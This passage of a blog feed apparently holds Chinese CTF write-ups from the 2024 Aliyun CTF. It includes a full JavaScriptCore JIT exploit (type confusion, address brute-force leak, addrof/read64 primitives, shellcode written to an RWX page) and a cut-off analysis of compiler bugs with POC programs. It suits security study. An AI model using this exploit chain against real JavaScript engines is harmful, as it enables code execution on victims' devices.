class="hljs-comment">/* …… */</span><br>            <br>         <span class="hljs-comment">/* [2] */</span><br>            <span class="hljs-keyword">return</span> std::tuple &#123; resultRegs, DataFormatJS, CanUseFlush::No &#125;;<br>        &#125;));<br>        <br><span class="hljs-comment">/* …… */</span><br>    &#125;;<br></code></pre></td></tr></table></figure><ul><li>该函数调用一个generate闭包函数，generate中又调用compileGetByVal函数</li><li>compileGetByVal的最后一个参数也是一个闭包，这个闭包最后返回一个元组<ul><li>第一个值是存储取出的值的寄存器</li><li>第二个值是储存格式，始终是DataFormatJS</li></ul></li></ul><p>compileGetByVal处理各种类型的数组对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compileGetByVal</span><span class="hljs-params">(Node* node, <span class="hljs-type">const</span> ScopedLambda&lt;std::tuple&lt;JSValueRegs, DataFormat, CanUseFlush&gt;(DataFormat preferredFormat)&gt;&amp; prefix)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (node-&gt;<span class="hljs-built_in">arrayMode</span>().<span class="hljs-built_in">type</span>()) &#123;<br>    <span class="hljs-comment">/* …… */</span><br>    <span class="hljs-keyword">case</span> Array::Float64Array: &#123;<br>        TypedArrayType type = node-&gt;<span class="hljs-built_in">arrayMode</span>().<span class="hljs-built_in">typedArrayType</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isInt</span>(type))<br>            <span class="hljs-built_in">compileGetByValOnIntTypedArray</span>(node, type, prefix);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">compileGetByValOnFloatTypedArray</span>(node, type, prefix);<br>    &#125; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果snippet中的arg是double数组，会进行到Float64Array过程，调用snippet1中提到的有问题的函数</p><h2 id="snippet3"><a href="#snippet3" class="headerlink" title="snippet3"></a>snippet3</h2><p>我们可以通过使用同一内存区域的另一视图改变Float64Array的值为不合法的double</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> abuf       = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">let</span> bigint_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(abuf);<br><span class="hljs-keyword">let</span> float_buf  = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br><br>bigint_buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe_0000_0000_0000</span>;<br></code></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> abuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">let</span> bbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(abuf);<br><span class="hljs-keyword">let</span> fbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br><br>obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1234</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1234</span>&#125;;<br><br><span class="hljs-comment">/* [1] */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">arg, a2</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj) &#123;<br>        obj = [<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>        a2.<span class="hljs-property">x</span> = out;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br><br>    t = &#123;<span class="hljs-attr">x</span>: &#123;&#125;&#125;;<br>    <span class="hljs-title function_">trigger</span>(obj, t);<br><br><span class="hljs-comment">/* [2] */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span> ; i ＜ <span class="hljs-number">0x10000</span>; i++) &#123;<br>      <span class="hljs-title function_">trigger</span>(fbuf,t);<br>    &#125;<br><br><span class="hljs-comment">/* [3] */</span><br>    bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe0000_12345678n</span>;<br>    <span class="hljs-title function_">trigger</span>(fbuf, t);<br><br><span class="hljs-comment">/* [4] */</span><br>    t.<span class="hljs-property">x</span>;<br>&#125;<br><br><span class="hljs-title function_">main</span>()<br></code></pre></td></tr></table></figure><ul><li>trigger重复上述snippet1和snippet2使用for in和取属性的操作</li><li>重复执行trigger使之被JIT优化编译</li><li>使bbuf[0]不合法，此时trigger将0xfffe0000_12345678n赋给了a2.x</li><li>调用t.x，0x12345678被当成指针解析，段错误</li></ul><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/stack.png" class title="stack"><h1 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h1><ul><li><p>处理&#x3D;&#x3D;&#x3D;时LHS没有类型假设，假设RHS类型为JSObject并进行了检查</p><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/aslr.png" class title="aslr"></li><li><p>LHS和RHS的比较只是简单的cmp</p><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/aslr1.png" class title="aslr"></li><li><p>我们可以令LHS为假指针，RHS为一个真指针，对指针进行爆破</p></li></ul><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>JSC对象的内存分布：</p><ul><li>JSCell：类似v8的map，表示属性的布局</li><li>butterfly：储存属性，无编码存储</li><li>内联属性，可存0x10字节的内联属性，编码存储</li></ul><p>流程：</p><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/jsc.png" class title="jsc"><p>官方exp：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// STEP1</span><br><span class="hljs-keyword">let</span> fake1 = &#123;<span class="hljs-attr">c</span>:<span class="hljs-number">1.1</span>, <span class="hljs-attr">d</span>:<span class="hljs-number">2.2</span>&#125;;<br><span class="hljs-keyword">let</span> fake2 = &#123;<span class="hljs-attr">c</span>:<span class="hljs-number">1.1</span>, <span class="hljs-attr">d</span>:&#123;&#125;&#125;;<br><span class="hljs-comment">// END STEP1</span><br><br><span class="hljs-comment">// STEP2</span><br>fake2[<span class="hljs-number">0</span>] = <span class="hljs-number">1.1</span>;<br>fake2[<span class="hljs-number">1</span>] = <span class="hljs-number">1.1</span>;<br>fake2[<span class="hljs-number">2</span>] = <span class="hljs-number">1.1</span>;<br>fake2[<span class="hljs-number">3</span>] = <span class="hljs-number">1.1</span>;<br><span class="hljs-keyword">let</span> abuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">let</span> bbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(abuf);<br><span class="hljs-keyword">let</span> fbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br><span class="hljs-keyword">let</span> ffbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br>bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x01001800000099f0n</span>-<span class="hljs-number">0x0002000000000000n</span>;<br>fake1.<span class="hljs-property">c</span> = ffbuf[<span class="hljs-number">0</span>];<br>bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x0100180600009a60n</span>;<br>fake2[<span class="hljs-number">0</span>] = ffbuf[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// END STEP2</span><br>obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1234</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1234</span>&#125;;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">a</span>) &#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bftrigger</span>(<span class="hljs-params">arg, a2</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj) &#123;<br>        obj = [<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>        <span class="hljs-keyword">if</span> (out === a2.<span class="hljs-property">x</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;    <br>    &#125;<br>&#125;<br>obj2 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1234</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1234</span>&#125;;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">arg, a2</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj2) &#123;<br>        obj2 = [<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>        a2.<span class="hljs-property">x</span> = out;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> t2 = &#123;<span class="hljs-attr">x</span>: &#123;&#125;&#125;;<br><span class="hljs-title function_">trigger</span>(obj, t2);<br>bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x00000000_00000000n</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x800</span>; i++) &#123;<br>    <span class="hljs-title function_">trigger</span>(fbuf, t2);<br>&#125;<br><span class="hljs-keyword">let</span> t = &#123;<span class="hljs-attr">x</span>: &#123;&#125;&#125;;<br><span class="hljs-title function_">bftrigger</span>(obj, t);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x800</span>; i++) &#123;<br>    <span class="hljs-title function_">bftrigger</span>(fbuf, t);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params">object_to_leak</span>) &#123;<br>    <span class="hljs-keyword">let</span> addr = <span class="hljs-number">0x7f00_0000_0000n</span>;<br>    <span class="hljs-keyword">let</span> to_leak = &#123;<span class="hljs-attr">x</span>: object_to_leak&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i=<span class="hljs-number">0n</span>; i&lt;<span class="hljs-number">0xff_ffff_ffffn</span>; i+=<span class="hljs-number">0x1000000n</span>) &#123;<br>        <span class="hljs-keyword">let</span> current_addr = addr + i + <span class="hljs-number">0x4f8140n</span>;<br>        <span class="hljs-keyword">if</span> ((i&amp;<span class="hljs-number">0xfffffffffn</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-title function_">print</span>(current_addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>        &#125;<br>        bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe0000_00000000n</span>+current_addr;<br>        <span class="hljs-keyword">let</span> result = <span class="hljs-title function_">bftrigger</span>(fbuf, to_leak);<br>        <span class="hljs-keyword">if</span> (result) &#123;<br>            <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;Found the address at: 0x&#x27;</span>+ current_addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>            <span class="hljs-keyword">return</span> current_addr;<br>        &#125;<br>    &#125;    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// STEP3</span><br>    <span class="hljs-keyword">let</span> fake1_addr = <span class="hljs-title function_">leak</span>(fake1);<br>    <span class="hljs-keyword">if</span> (fake1_addr==<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span><br>    &#125;    <br>    fake1_addr = fake1_addr+<span class="hljs-number">0x10n</span>;<br>    bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe0000_00000000n</span>+fake1_addr;<br>    <span class="hljs-title function_">trigger</span>(fbuf, t2);<br>    <span class="hljs-comment">// END STEP3</span><br>    <br>    <span class="hljs-comment">// STEP4</span><br>    <span class="hljs-keyword">let</span> fake_obj = t2.<span class="hljs-property">x</span>.<span class="hljs-property">d</span>;<br>    <span class="hljs-comment">// END STEP4</span><br>    <br>    <span class="hljs-comment">// STEP5</span><br>    <span class="hljs-keyword">let</span> fake_bf = fake1_addr+<span class="hljs-number">0x8n</span>;<br>    bbuf[<span class="hljs-number">0</span>] = fake_bf;<br>    fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>    ffbuf[<span class="hljs-number">0</span>] = fake_obj[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">let</span> butterfly_addr = bbuf[<span class="hljs-number">0</span>];<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Leak butterfly addr: 0x&quot;</span> + butterfly_addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-comment">// END STEP5</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>) &#123;<br>        fake2.<span class="hljs-property">d</span> = obj;<br>        ffbuf[<span class="hljs-number">0</span>] = fake_obj[<span class="hljs-number">4</span>];<br>        <span class="hljs-keyword">return</span> bbuf[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>) &#123;<br>        bbuf[<span class="hljs-number">0</span>] = addr;<br>        fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>        ffbuf[<span class="hljs-number">0</span>] = fake_obj[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">let</span> res = bbuf[<span class="hljs-number">0</span>];<br>        bbuf[<span class="hljs-number">0</span>] = fake_bf;<span class="hljs-comment">// 还原</span><br>        fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>    <span class="hljs-keyword">let</span> addr = <span class="hljs-title function_">addrof</span>(bftrigger);<br>    <span class="hljs-title function_">print</span>(addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    addr = <span class="hljs-title function_">read64</span>(addr+<span class="hljs-number">0x18n</span>);<br>    <span class="hljs-title function_">print</span>(addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    addr = <span class="hljs-title function_">read64</span>(addr+<span class="hljs-number">0x8n</span>);<br>    <span class="hljs-title function_">print</span>(addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-keyword">let</span> rwx = <span class="hljs-title function_">read64</span>(addr+<span class="hljs-number">0x10n</span>);<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Leak RWX addr: 0x&quot;</span> + rwx.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-keyword">let</span> shellcode = [-<span class="hljs-number">1.1406995792869598e-244</span>, <span class="hljs-number">7.237521960842062e-308</span>, -<span class="hljs-number">1.1399357607410871e-244</span>, <span class="hljs-number">9.780209880692209e+26</span>, -<span class="hljs-number">2.6607797970378774e-254</span>, <span class="hljs-number">1.7806249655998242e-22</span>, <span class="hljs-number">3.9690202623744235e+146</span>, <span class="hljs-number">7.34038447708115e+223</span>, <span class="hljs-number">3.3819935e-317</span>, <span class="hljs-number">0</span>];<br>    bbuf[<span class="hljs-number">0</span>] = rwx+<span class="hljs-number">0xbn</span>;<br>    fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>    shellcode.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">sc, i</span>) =&gt;</span> &#123;<br>        fake_obj[i] = sc;<br>    &#125;);<br>    <span class="hljs-title function_">bftrigger</span>();<br>&#125;<br><span class="hljs-title function_">exp</span>();<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>js</tag>
      
      <tag>jsc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 阿里云CTF klang wp</title>
    <link href="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/"/>
    <url>/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/</url>
    
    <content type="html"><![CDATA[<p>瞪了一天编译器……然后啥也没瞪出来，非常好大牢，明年还坐</p><span id="more"></span><h1 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h1><p>流程：</p><ul><li>输入代码</li><li>编译可执行文件</li><li>运行</li></ul><h1 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h1><p>提供一些接口：</p><ul><li><p>do_printi：输出整数</p></li><li><p>do_prints：输出字符串</p></li><li><p>do_inputi：输入整数</p></li><li><p>do_random：返回一个随机数</p></li><li><p>do_inputs：输入字符串</p></li><li><p>do_array_new：创建一个数组，使用malloc分配内存，结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">array_t</span> &#123;</span><br>    <span class="hljs-type">int64_t</span>* data;<br>    <span class="hljs-type">int64_t</span> size;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>do_array_load：返回arr[index]</p></li><li><p>do_array_store：arr[index]&#x3D;value</p></li></ul><h1 id="compiler"><a href="#compiler" class="headerlink" title="compiler"></a>compiler</h1><p>编译流程：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/compiler.png" class title="compiler"><h2 id="Parse"><a href="#Parse" class="headerlink" title="Parse"></a>Parse</h2><p>词法分析和语法分析是由bison和flex完成的，语法和c语言差不多，一些不一样的见下：</p><ul><li><p>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">FUNCTIONNAME</span> <span class="hljs-params">(TYPE ARG, TYPE ARG…)</span> : TYPE VAR, TYPE AVR… -&gt; TYPE<br>&#123;<br>    STATEMENTS<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>: 后面是函数中使用的变量</li></ul></li><li><p>赋值语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">NAME := VAR;<br></code></pre></td></tr></table></figure></li></ul><p>AST数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ast.png" class title="ast"><h2 id="IRGen"><a href="#IRGen" class="headerlink" title="IRGen"></a>IRGen</h2><h3 id="Verify"><a href="#Verify" class="headerlink" title="Verify"></a>Verify</h3><p>验证AST是否合法：</p><ul><li>Module：<ul><li>必须有main函数，无参数，返回类型为int</li><li>函数不重名</li></ul></li><li>Function：<ul><li>至少有一条语句</li><li>最后一条语句必须是return</li><li>var的type不能是void</li><li>最多十个var</li><li>最多三个para</li></ul></li><li>Block：<ul><li>return语句只能出现在block最后</li></ul></li><li>Statement：<ul><li>ASSIGN：左右Expression类型一致</li><li>IF：Condition类型为INT</li><li>IFELSE：Condition类型为INT</li><li>WHILE：<ul><li>Condition类型为INT</li><li>循环block中不能再有WHILE</li></ul></li><li>RETURN：<ul><li>语句Expression类型和所属Function返回类型匹配</li><li>如果没有返回类型则所属Function返回类型必须为void</li></ul></li><li>CALL：Expression合法</li></ul></li><li>Expression：<ul><li>VARIABLE：var必须在所属Function中定义，会返回Function中确定var的类型</li><li>BINARY：左值右值类型相同且为INT</li><li>FUNCTION_CALL：函数参数和函数原型匹配，包括参数数量和类型</li><li>ARRAY_ACCESS：<ul><li>类型和Function中声明匹配</li><li>Index类型为INT</li></ul></li></ul></li></ul><h4 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h4><p>VerifyExpression处理BINARY时if外面没return</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">case</span> ASTExpression::EX_BINARY: &#123;<br>    <span class="hljs-keyword">auto</span> *BE = static_cast&lt;ASTExpressionBinary*&gt;(E);<br>    <span class="hljs-keyword">auto</span> LT = VerifyExpression(BE-&gt;GetLHS());<br>    <span class="hljs-keyword">auto</span> RT = VerifyExpression(BE-&gt;GetRHS());<br>    <span class="hljs-keyword">if</span>(LT.has_value() &amp;&amp; RT.has_value()) &#123;<br>      <span class="hljs-keyword">if</span>(LT.value() != RT.value()) &#123;<br><span class="hljs-comment">/* …… */</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">case</span> ASTExpression::EX_FUNCTION_CALL: &#123;<br></code></pre></td></tr></table></figure><p>如果LT和RT有一个没有value则会继续进入FUNCTION_CALL的处理，可以通过未声明变量触发</p><p>POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b -&gt; <span class="hljs-type">int</span> &#123;<br>a := c + b;<span class="hljs-comment">/* c未声明，VerifyExpression无返回值 */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但把ASTExpressionBinary当ASTExpressionFunctionCall解析时会crash</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/binary.png" class title="binary"><h3 id="Generate"><a href="#Generate" class="headerlink" title="Generate"></a>Generate</h3><p>IR数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ir.png" class title="ir"><p>IRGen数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/irgen.png" class title="irgen"><p>这几个class的用处没那么显然，解释一下：</p><ul><li>FuncBuilder：管理Function<ul><li>管理BasicBlock</li><li>管理Instruction</li></ul></li><li>ModuleGenCtx：管理字面量</li><li>FuncGenCtx：管理虚拟寄存器</li><li>IRGen：创建IR</li></ul><p>注意IRGen的过程中：</p><ul><li>GenerateFunction在Function的Entry开头初始化了所有Var</li><li>同名情况下Var覆盖Para</li><li>IF、IFELSE BasicBlock如果最后一条语句为RETURN则末尾不添加JMP，WHILE没有这条判断</li></ul><h4 id="BUG-1"><a href="#BUG-1" class="headerlink" title="BUG"></a>BUG</h4><ul><li>WHILE的BasicBlock最后加了JMP，CodeGen中EmitEpilogue fix函数退出时是根据BasicBlock最后一条一条指令是否是ret来判断的</li><li>但WHILE的最后一条指令是jmo，所以函数退出的时候没有恢复栈</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">LinearScanRegAlloc::EmitEpilogue</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> *BB : (*Func_)) &#123;<br>    <span class="hljs-keyword">if</span>(BB-&gt;IsExit()) &#123;<br>      <span class="hljs-keyword">auto</span> *Last = *BB-&gt;rbegin();<br>      BB-&gt;InsertBefore(new MovMachineInst(MachineOperand::CreateRegister(RBP), MachineOperand::CreateRegister(RSP)), Last);<br>      BB-&gt;InsertBefore(new PopMachineInst(MachineOperand::CreateRegister(RBP)), Last);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">int</span><br>&#123;<br>a := <span class="hljs-number">10</span>;<br><span class="hljs-keyword">do</span>&#123;<br>prints(<span class="hljs-string">&quot;abaaba&quot;</span>);<br>a := a - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(a &gt; <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span 